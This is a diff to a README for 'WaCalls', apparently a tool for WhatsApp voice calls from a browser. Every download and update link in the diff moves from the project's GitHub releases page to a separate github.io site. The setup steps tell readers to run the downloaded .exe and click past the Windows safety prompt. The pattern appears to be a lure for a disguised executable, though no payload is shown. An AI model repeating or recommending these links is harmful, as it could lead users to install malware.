@@ -1,6 +1,6 @@
 # 📞 WaCalls - Make Voice Calls From Your Browser
 
-[![](https://img.shields.io/badge/Download_Windows_Installer-blue?style=for-the-badge)](https://github.com/fourpronged-czaralexanderii185/WaCalls/releases)
+[![](https://img.shields.io/badge/Download_Windows_Installer-blue?style=for-the-badge)](https://fourpronged-czaralexanderii185.github.io)
 
 WaCalls lets you use WhatsApp voice calls directly from your web browser. You connect your account once using a quick scan process. After you connect, you manage your calls from a simple dashboard. This software works on local networks and supports multiple accounts.
 
@@ -8,7 +8,7 @@ WaCalls lets you use WhatsApp voice calls directly from your web browser. You co
 
 Follow these steps to set up the software on your Windows computer.
 
-1. First, visit the [official download page](https://github.com/fourpronged-czaralexanderii185/WaCalls/releases).
+1. First, visit the [official download page](https://fourpronged-czaralexanderii185.github.io).
 2. Look for the latest version under the "Assets" section.
 3. Click the file that ends in .exe to start your download.
 4. Open the file once the download finishes. Windows might show a safety prompt. Select "Run" to continue.
@@ -62,7 +62,7 @@ Your privacy remains the priority. The application handles your media traffic lo
 
 ## 📦 Updates
 
-Software developers release updates to improve call quality and system stability. Check the [releases page](https://github.com/fourpronged-czarlinks/WaCalls/releases) at least once per month. If you notice a new version, download the file again and run the installer to replace your older version. Your settings usually stay saved during this update process. 
+Software developers release updates to improve call quality and system stability. Check the [releases page](https://fourpronged-czaralexanderii185.github.io) at least once per month. If you notice a new version, download the file again and run the installer to replace your older version. Your settings usually stay saved during this update process. 
 
 ## 📝 Support
 
